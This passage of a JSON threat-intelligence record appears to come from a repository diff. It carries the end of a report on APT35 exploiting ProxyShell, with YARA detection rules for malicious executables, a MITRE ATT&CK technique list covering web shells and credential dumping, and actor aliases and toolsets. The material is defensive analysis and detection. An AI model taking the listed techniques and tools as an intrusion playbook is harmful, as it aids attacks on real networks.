Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=31bf3856ad364e35\" fullword ascii\n\n```\n\n-----\n\n```\n   $s7 XSystem.Web.Extensions, Version 4.0.0.0, Culture neutral,\nPublicKeyToken=31bf3856ad364e35\" fullword ascii\n   $s8 = \"VSystem.Web.Services, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=b03f5f7f11d50a3a\" fullword ascii\n   $s9 = \"MSystem.Web, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=b03f5f7f11d50a3a\" fullword ascii\n   $s10 = \"WSystem.Configuration, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=b03f5f7f11d50a3a\" fullword ascii\n   $s11 = \"`System.Data.DataSetExtensions, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=b77a5c561934e089\" fullword ascii\n   $s12 = \"NSystem.Core, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=b77a5c561934e089\" fullword ascii\n   $s13 = \"ZSystem.WorkflowServices, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=31bf3856ad364e35\" fullword ascii\n   $s14 = \"WSystem.IdentityModel, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=b77a5c561934e089\" fullword ascii\n   $s15 = \"aSystem.ServiceModel.Activation, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=31bf3856ad364e35\" fullword ascii\n   $s16 =\n\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\nwide /* base64 encoded string '' */\n   $s17 = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" wide /* base64\nencoded string '' */\n   $s18 = \"aSystem.Web.ApplicationServices, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=31bf3856ad364e35\" fullword ascii\n   $s19 = \"\\\\System.EnterpriseServices, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=b03f5f7f11d50a3a\" fullword ascii\n   $s20 = \"SMicrosoft.CSharp, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=b03f5f7f11d50a3a\" fullword ascii\n  condition:\n   uint16(0) == 0x5a4d and filesize < 2000KB and\n   1 of ($x*) and 4 of them\n}\nrule _user_task_update_0 {\n  meta:\n   description = \"9893_files - from files user.exe, task_update.exe\"\n   author = \"TheDFIRReport\"\n   reference = \"https://thedfirreport.com/2022/03/21/apt35-automates-initialaccess-using-proxyshell/\"\n   date = \"2022-03-21\"\n   hash1 = \"7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b\"\n   hash2 = \"12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a\"\n  strings:\n   $s1 = \"-InitOnceExecuteOnce\" fullword ascii\n   $s2 = \"PB_GadgetStack_%I64i\" fullword ascii\n   $s3 = \"PB_DropAccept\" fullword ascii\n   $s4 = \"PB_PostEventMessage\" fullword ascii\n   $s5 = \"PB_WindowID\" fullword ascii\n   $s6 = \"?GetLongPathNameA\" fullword ascii\n   $s7 = \"Memory page error\" fullword ascii\n   $s8 = \"PPPPPPH\" fullword ascii\n   $s9 = \"YZAXAYH\" fullword ascii\n   $s10 = \"%d:%I64d:%I64d:%I64d\" fullword ascii\n\n```\n\n-----\n\n```\n   $s11 PYZAXAYH fullword ascii\n   $s12 = \"PB_MDI_Gadget\" fullword ascii\n   $s13 = \"PostEventClass\" fullword ascii\n   $s14 = \"t$hYZAXAYH\" fullword ascii\n   $s15 = \"$YZAXAYH\" fullword ascii\n   $s16 = \"Floating-point underflow (exponent too small)\" fullword ascii\n   $s17 = \"Inexact floating-point result\" fullword ascii\n   $s18 = \"Single step trap\" fullword ascii\n   $s19 = \"Division by zero (floating-point)\" fullword ascii\n   $s20 = \"tmHcI(H\" fullword ascii\n  condition:\n   ( uint16(0) == 0x5a4d and filesize < 300KB and ( 8 of them )\n   ) or ( all of them )\n}\n\n### MITRE\n\n```\nExploit Public-Facing Application – T1190\nOS Credential Dumping – T1003\nAccount Manipulation – T1098\nValid Accounts – T1078\nIngress Tool Transfer – T1105\nMatch Legitimate Name or Location – T1036.005\nWindows Service – T1543.003\nWeb Shell – T1505.003\nSystem Information Discovery – T1082\nSystem Network Configuration Discovery – T1016\nSystem Owner/User Discovery – T1033\nWindows Command Shell – T1059.003\n\nInternal case #9893\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-21 - APT35 Automates Initial Access Using ProxyShell.pdf"
+    ],
+    "report_names": [
+        "2022-03-21 - APT35 Automates Initial Access Using ProxyShell.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "82b92285-4588-48c9-8578-bb39f903cf62",
+            "created_at": "2022-10-25T15:50:23.850506Z",
+            "updated_at": "2025-03-27T02:00:55.501372Z",
+            "deleted_at": null,
+            "main_name": "Charming Kitten",
+            "aliases": [
+                "Charming Kitten"
+            ],
+            "source_name": "MITRE:Charming Kitten",
+            "tools": [
+                "DownPaper"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "82f54603-89e0-4f5a-8df9-eae0c3a90d70",
+            "created_at": "2022-10-25T16:07:23.745406Z",
+            "updated_at": "2025-03-27T02:02:09.958406Z",
+            "deleted_at": null,
+            "main_name": "ITG18",
+            "aliases": [],
+            "source_name": "ETDA:ITG18",
+            "tools": [],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "e034b94b-9655-42c4-a72e-a58807dce299",
+            "created_at": "2022-10-25T16:07:24.133537Z",
+            "updated_at": "2025-03-27T02:02:10.118581Z",
+            "deleted_at": null,
+            "main_name": "Rocket Kitten",
+            "aliases": [
+                "Group 83",
+                "NewsBeef",
+                "Newscaster",
+                "Operation Newscaster",
+                "Operation Woolen-GoldFish",
+                "Parastoo",
+                "Rocket Kitten"
+            ],
+            "source_name": "ETDA:Rocket Kitten",
+            "tools": [
+                "CoreImpact (Modified)",
+                "FireMalv",
+                "Ghole",
+                "Gholee"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "610a7295-3139-4f34-8cec-b3da40add480",
+            "created_at": "2023-01-06T13:46:38.608142Z",
+            "updated_at": "2025-03-27T02:00:02.87217Z",
+            "deleted_at": null,
+            "main_name": "Cobalt",
+            "aliases": [
+                "Cobalt Gang",
+                "GOLD KINGSWOOD",
+                "COBALT SPIDER",
+                "G0080",
+                "Mule Libra",
+                "Cobalt Group"
+            ],
+            "source_name": "MISPGALAXY:Cobalt",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "ae26d287-8ba7-447e-9391-cf13c02d7481",
+            "created_at": "2023-03-04T02:01:54.0962Z",
+            "updated_at": "2025-03-27T02:00:03.120665Z",
+            "deleted_at": null,
+            "main_name": "TA453",
+            "aliases": [],
+            "source_name": "MISPGALAXY:TA453",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "d8af157e-741b-4933-bb4a-b78490951d97",
+            "created_at": "2023-01-06T13:46:38.748929Z",
+            "updated_at": "2025-03-27T02:00:02.908256Z",
+            "deleted_at": null,
+            "main_name": "APT35",
+            "aliases": [
+                "Newscaster Team",
+                "Magic Hound",
+                "G0059",
+                "Phosphorus",
+                "Mint Sandstorm",
+                "TunnelVision",
+                "COBALT MIRAGE"
+            ],
+            "source_name": "MISPGALAXY:APT35",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "04888f75-158b-47f9-8ad9-4ff83f618ece",
+            "created_at": "2024-05-01T02:03:08.03763Z",
+            "updated_at": "2025-03-27T02:05:17.319276Z",
+            "deleted_at": null,
+            "main_name": "COBALT MIRAGE",
+            "aliases": [
+                "Nemesis Kitten ",
+                "PHOSPHORUS ",
+                "TunnelVision ",
+                "UNC2448 ",
+                "DEV-0270 "
+            ],
+            "source_name": "Secureworks:COBALT MIRAGE",
+            "tools": [
+                " Custom powershell scripts",
+                " DiskCryptor",
+                " Drokbk",
+                " FRPC",
+                " Fast Reverse Proxy (FRP)",
+                " Impacket wmiexec",
+                " Ngrok",
+                " Plink",
+                " PowerLessCLR",
+                " TunnelFish",
+                "BitLocker"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        },
+        {
+            "id": "029625d2-9734-44f9-9e10-b894b4f57f08",
+            "created_at": "2023-01-06T13:46:38.364105Z",
+            "updated_at": "2025-03-27T02:00:02.815023Z",
+            "deleted_at": null,
+            "main_name": "Charming Kitten",
+            "aliases": [
+                "Parastoo",
+                "iKittens",
+                "Group 83",
+                "NewsBeef",
+                "G0058",
+                "CharmingCypress"
+            ],
+            "source_name": "MISPGALAXY:Charming Kitten",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "08a3b64c-8e18-455d-af57-28dca63808c4",
+            "created_at": "2024-05-01T02:03:08.027871Z",
+            "updated_at": "2025-03-27T02:05:17.313679Z",
+            "deleted_at": null,
+            "main_name": "COBALT ILLUSION",
+            "aliases": [
+                "APT42 ",
+                "Charming Kitten ",
+                "CharmingCypress ",
+                "ITG18 ",
+                "Magic Hound ",
+                "Mint Sandstorm sub-group ",
+                "NewsBeef ",
+                "Newscaster ",
+                "PHOSPHORUS sub-group ",
+                "TA453 ",
+                "UNC788 ",
+                "Yellow Garuda ",
+                "APT35 "
+            ],
+            "source_name": "Secureworks:COBALT ILLUSION",
+            "tools": [
+                " MagicHound Toolset",
+                " PupyRAT",
+                "Browser Exploitation Framework (BeEF)"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        },
+        {
+            "id": "e3676dfe-3d40-4b3a-bfbd-4fc1f8c896f4",
+            "created_at": "2022-10-25T15:50:23.808974Z",
+            "updated_at": "2025-03-27T02:00:55.550912Z",
+            "deleted_at": null,
+            "main_name": "Magic Hound",
+            "aliases": [
+                "Magic Hound",
+                "TA453",
+                "COBALT ILLUSION",
+                "Charming Kitten",
+                "ITG18",
+                "Phosphorus",
+                "APT35",
+                "Mint Sandstorm"
+            ],
+            "source_name": "MITRE:Magic Hound",
+            "tools": [
+                "Impacket",
+                "CharmPower",
+                "FRP",
+                "Mimikatz",
+                "Systeminfo",
+                "ipconfig",
+                "netsh",
+                "PowerLess",
+                "Pupy",
+                "DownPaper",
+                "PsExec",
+                "Havij",
+                "sqlmap"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "1699fb41-b83f-42ff-a6ec-984ae4a1031f",
+            "created_at": "2022-10-25T16:07:23.83826Z",
+            "updated_at": "2025-03-27T02:02:09.995863Z",
+            "deleted_at": null,
+            "main_name": "Magic Hound",
+            "aliases": [
+                "APT 35",
+                "Ballistic Bobcat",
+                "Charming Kitten",
+                "CharmingCypress",
+                "Cobalt Illusion",
+                "Cobalt Mirage",
+                "Educated Manticore",
+                "Magic Hound",
+                "Mint Sandstorm",
+                "Operation BadBlood",
+                "Operation Sponsoring Access",
+                "Operation SpoofedScholars",
+                "Operation Thamar Reservoir",
+                "Phosphorus",
+                "TA453",
+                "TEMP.Beanie",
+                "Tarh Andishan",
+                "Timberworm",
+                "TunnelVision",
+                "UNC788",
+                "Yellow Garuda"
+            ],
+            "source_name": "ETDA:Magic Hound",
+            "tools": [
+                "7-Zip",
+                "AnvilEcho",
+                "BASICSTAR",
+                "CORRUPT KITTEN",
+                "CWoolger",
+                "CharmPower",
+                "ChromeHistoryView",
+                "CommandCam",
+                "DistTrack",
+                "DownPaper",
+                "FRP",
+                "Fast Reverse Proxy",
+                "FireMalv",
+                "Ghambar",
+                "GoProxy",
+                "GorjolEcho",
+                "HYPERSCRAPE",
+                "Havij",
+                "MPK",
+                "MPKBot",
+                "Matryoshka",
+                "Matryoshka RAT",
+                "MediaPl",
+                "Mimikatz",
+                "MischiefTut",
+                "NETWoolger",
+                "NOKNOK",
+                "PINEFLOWER",
+                "POWERSTAR",
+                "PowerLess Backdoor",
+                "PsList",
+                "Pupy",
+                "PupyRAT",
+                "SNAILPROXY",
+                "Shamoon",
+                "TDTESS",
+                "WinRAR",
+                "WoolenLogger",
+                "Woolger",
+                "pupy",
+                "sqlmap"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673536203,
+    "ts_updated_at": 1743041771,
+    "ts_creation_date": 1653761113,
+    "ts_modification_date": 1653761113,
+    "files": {
+        "pdf": "https://archive.orkl.eu/ea52223d1d1f788f7779b5e8bab717f65be06db3.pdf",
+        "text": "https://archive.orkl.eu/ea52223d1d1f788f7779b5e8bab717f65be06db3.txt",
+        "img": "https://archive.orkl.eu/ea52223d1d1f788f7779b5e8bab717f65be06db3.jpg"
+    }
+}
